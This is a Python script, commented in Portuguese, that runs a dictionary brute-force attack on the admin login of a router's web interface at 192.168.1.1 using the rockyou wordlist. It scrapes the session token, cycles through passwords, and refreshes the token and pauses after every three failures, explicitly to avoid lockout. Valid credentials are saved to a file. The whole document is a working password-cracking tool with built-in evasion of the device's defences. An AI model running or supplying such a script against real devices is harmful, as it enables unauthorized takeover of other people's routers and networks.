import requests
from bs4 import BeautifulSoup
import time

url = "http://192.168.1.1/?_type=loginData&_tag=login_entry"
username = "admin"
wordlist_path = "/usr/share/wordlists/rockyou.txt"

def create_session():
    return requests.Session()

def get_token(session):
    r = session.get("http://192.168.1.1")
    soup = BeautifulSoup(r.text, "html.parser")
    token_input = soup.find("input", {"name": "_sessionTOKEN"})
    if not token_input:
        raise Exception("Token _sessionTOKEN não encontrado na página de login.")
    return token_input["value"]

def is_login_successful(response):
    if "login_error" in response.text:
        return False
    if "Logout" in response.text or "Dashboard" in response.text or "Status" in response.text:
        return True
    return False

# carrega a wordlist
with open(wordlist_path, encoding="latin-1") as f:
    passwords = [line.strip() for line in f if line.strip()]

print(f"[+] Iniciando ataque com o usuário: {username}")

# cria sessão e token
session = create_session()
token = get_token(session)
fail_count = 0

for password in passwords:
    try:
        if fail_count == 3:
            print("[!] 3 falhas. Atualizando token para evitar bloqueio...")
            token = get_token(session)
            fail_count = 0
            time.sleep(5)  # pequena pausa para evitar bloqueio real

        data = {
            "Frm_Username": username,
            "Frm_Password": password,
            "_sessionTOKEN": token
        }

        r = session.post(url, data=data)

        if is_login_successful(r):
            print(f"[+] SUCESSO! Credenciais válidas: {username}:{password}")
            with open("login_success.txt", "a") as out:
                out.write(f"{username}:{password}\n")
            break
        else:
            print(f"[-] Falha: {username}:{password}")
            fail_count += 1

        time.sleep(0.5)

    except Exception as e:
        print(f"[!] Erro com {username}:{password} -> {e}")
        continue